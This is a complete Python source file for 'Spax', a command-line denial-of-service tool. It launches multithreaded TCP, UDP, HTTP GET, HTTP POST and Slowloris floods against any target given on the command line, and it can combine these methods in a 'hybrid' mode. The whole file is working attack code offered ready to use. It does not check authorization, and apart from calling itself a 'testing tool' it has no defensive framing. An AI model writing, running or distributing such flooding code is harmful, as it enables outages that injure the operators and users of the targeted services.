import argparse
import socket
import threading
import time
import random
import sys
import signal
from urllib.parse import urlparse

class Colors:
    """Terminal colors"""
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    CYAN = '\033[96m'
    BOLD = '\033[1m'
    END = '\033[0m'

class SpaxDoS:
    """Main Spax DoS class"""

    def __init__(self):
        self.target_url = None
        self.target_ip = None
        self.target_hostname = None
        self.target_port = 80
        self.threads = []
        self.running = False
        self.stats = {
            'requests_sent': 0,
            'successful': 0,
            'failed': 0,
            'bytes_sent': 0,
            'start_time': None
        }
        self.lock = threading.Lock()
        signal.signal(signal.SIGINT, self.signal_handler)

    def signal_handler(self, sig, frame):
        """Exit with Ctrl+C"""
        print(f"\n{Colors.YELLOW}[!] Stopping the attack...{Colors.END}")
        self.stop_attack()
        sys.exit(0)

    def parse_target(self, target):
        """Parse the Target URL"""
        try:
            if not target.startswith(('http://', 'https://')):
                target = 'http://' + target

            parsed = urlparse(target)
            self.target_url = target
            self.target_hostname = parsed.hostname
            self.target_ip = socket.gethostbyname(parsed.hostname)
            self.target_port = parsed.port or (443 if parsed.scheme == 'https' else 80)

            print(f"{Colors.GREEN}[+] Target: {target}{Colors.END}")
            print(f"{Colors.GREEN}[+] IP: {self.target_ip}:{self.target_port}{Colors.END}")
            return True

        except Exception as e:
            print(f"{Colors.RED}[-] Failed to parse target: {e}{Colors.END}")
            return False

    def update_stats(self, success=True, sent_bytes=0):
        """Update statistics"""
        with self.lock:
            self.stats['requests_sent'] += 1
            self.stats['bytes_sent'] += sent_bytes
            if success:
                self.stats['successful'] += 1
            else:
                self.stats['failed'] += 1

    def print_stats(self):
        """Print statistics"""
        with self.lock:
            elapsed = time.time() - self.stats['start_time']
            rps = self.stats['requests_sent'] / elapsed if elapsed > 0 else 0
            total_mb = self.stats['bytes_sent'] / 1024 / 1024

            print(f"\r{Colors.CYAN}[*] Requests: {self.stats['requests_sent']} | "
                  f"Successful: {self.stats['successful']} | "
                  f"Failed: {self.stats['failed']} | "
                  f"RPS: {rps:.1f} | "
                  f"Data Sent: {total_mb:.2f} MB{Colors.END}", end='', flush=True)

    def tcp_flood_worker(self):
        """TCP flood worker thread"""
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3)
                s.connect((self.target_ip, self.target_port))
                data = random.randbytes(1024)
                s.send(data)
                s.close()
                self.update_stats(True, len(data))
            except Exception:
                self.update_stats(False)
                time.sleep(0.01)

    def http_flood_worker(self):
        """HTTP GET flood worker with Keep-Alive for higher RPS"""
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
        ]
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(5)
                s.connect((self.target_ip, self.target_port))
                
                for _ in range(100):
                    if not self.running: break

                    user_agent = random.choice(user_agents)
                    random_path = "".join(random.choice("abcdefghijklmnopqrstuvwxyz0123456789") for _ in range(10))
                    http_request = f"""GET /?q={random_path} HTTP/1.1\r
Host: {self.target_hostname}\r
User-Agent: {user_agent}\r
Connection: keep-alive\r
\r
"""
                    s.send(http_request.encode())
                    self.update_stats(True, len(http_request.encode()))
                
                s.close()
            except Exception:
                self.update_stats(False)
                time.sleep(0.01)

    def http_post_worker(self):
        """HTTP POST flood worker thread"""
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36'
        ]
        while self.running:
            try:
                post_data = "".join(random.choice("abcdefghijklmnopqrstuvwxyz0123456789") for _ in range(1024))
                
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(5)
                s.connect((self.target_ip, self.target_port))

                user_agent = random.choice(user_agents)
                http_request = f"""POST / HTTP/1.1\r
Host: {self.target_hostname}\r
User-Agent: {user_agent}\r
Content-Type: application/x-www-form-urlencoded\r
Content-Length: {len(post_data)}\r
Connection: keep-alive\r
\r
{post_data}"""
                
                s.send(http_request.encode())
                s.recv(4096)
                s.close()
                self.update_stats(True, len(http_request.encode()))
            except Exception:
                self.update_stats(False)
                time.sleep(0.01)

    def udp_flood_worker(self):
        """UDP flood worker thread"""
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                data = random.randbytes(1024)
                s.sendto(data, (self.target_ip, self.target_port))
                s.close()
                self.update_stats(True, len(data))
            except Exception:
                self.update_stats(False)

    def slowloris_worker(self):
        """Slowloris Attack"""
        connections = []
        while self.running:
            try:
                if len(connections) < 200:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(10)
                    s.connect((self.target_ip, self.target_port))
                    s.send(b"GET / HTTP/1.1\r\n")
                    s.send(f"Host: {self.target_hostname}\r\n".encode())
                    connections.append(s)
                    self.update_stats(True)
                
                for conn in list(connections):
                    try:
                        conn.send(b"X-a: b\r\n")
                    except socket.error:
                        connections.remove(conn)
                
                time.sleep(15)
            except Exception:
                self.update_stats(False)
                time.sleep(1)

    def start_attack(self, attack_types_str='http', threads=50, duration=None):
        """Start the attack(s)"""
        attack_methods = {
            'tcp': self.tcp_flood_worker,
            'http': self.http_flood_worker,
            'post': self.http_post_worker,
            'udp': self.udp_flood_worker,
            'slow': self.slowloris_worker
        }

        print(f"\n{Colors.YELLOW}[*] Attack in progress...{Colors.END}")
        
        self.running = True
        self.stats['start_time'] = time.time()
        
        
        attack_list = [method.strip() for method in attack_types_str.split(',')]
        threads_per_method = threads // len(attack_list) if attack_list else 0

        for attack_type in attack_list:
            if attack_type in attack_methods:
                worker_method = attack_methods[attack_type]
                print(f"{Colors.CYAN}[*] Starting {attack_type.upper()} with {threads_per_method} threads...{Colors.END}")
                for i in range(threads_per_method):
                    t = threading.Thread(target=worker_method, daemon=True)
                    t.start()
                    self.threads.append(t)
            else:
                print(f"{Colors.RED}[-] Invalid attack type ignored: {attack_type}{Colors.END}")

        print(f"{Colors.YELLOW}[*] Press Ctrl+C to stop{Colors.END}\n")
        
        start_time = time.time()
        try:
            while self.running:
                self.print_stats()
                time.sleep(0.5)
                if duration and (time.time() - start_time) >= duration:
                    break
        except KeyboardInterrupt:
            pass
        
        self.stop_attack()

    def stop_attack(self):
        """Stop the attack"""
        if not self.running:
            return
        self.running = False

        
        time.sleep(0.5)
        
        print(f"\n\n{Colors.GREEN}[+] Attack completed!{Colors.END}")
        
        elapsed = time.time() - self.stats['start_time']
        rps = self.stats['requests_sent'] / elapsed if elapsed > 0 else 0
        total_mb = self.stats['bytes_sent'] / 1024 / 1024
        
        print(f"{Colors.CYAN}[*] Total Requests: {self.stats['requests_sent']}{Colors.END}")
        print(f"{Colors.GREEN}[*] Successful: {self.stats['successful']}{Colors.END}")
        print(f"{Colors.RED}[*] Failed: {self.stats['failed']}{Colors.END}")
        print(f"{Colors.CYAN}[*] Average RPS: {rps:.2f}{Colors.END}")
        print(f"{Colors.CYAN}[*] Total Data Sent: {total_mb:.2f} MB{Colors.END}")
        print(f"{Colors.CYAN}[*] Total Duration: {elapsed:.2f}s{Colors.END}")

def main():
    """Main function"""
    parser = argparse.ArgumentParser(
        description='Spax - Aggressive DoS Testing Tool',
        epilog="Example for hybrid attack: -m http,post,tcp -t 150"
    )
    
    parser.add_argument('-d', '--target', required=True, help='Target URL or IP')
    parser.add_argument('-m', '--method', default='http', help='Attack type, comma-separated for hybrid mode (e.g., http,post)')
    parser.add_argument('-t', '--threads', type=int, default=50, help='Total thread count')
    parser.add_argument('-s', '--seconds', type=int, help='Attack duration (seconds)')
    parser.add_argument('-q', '--quiet', action='store_true', help='Hide input messages (used by BAT)')
    
    args = parser.parse_args()
    
    spax = SpaxDoS()
    
    if not spax.parse_target(args.target):
        sys.exit(1)
    
    try:
        spax.start_attack(
            attack_types_str=args.method,
            threads=args.threads,
            duration=args.seconds
        )
    except Exception as e:
        print(f"\n{Colors.RED}[-] An unexpected error occurred: {e}{Colors.END}")
        sys.exit(1)

if __name__ == "__main__":
    main()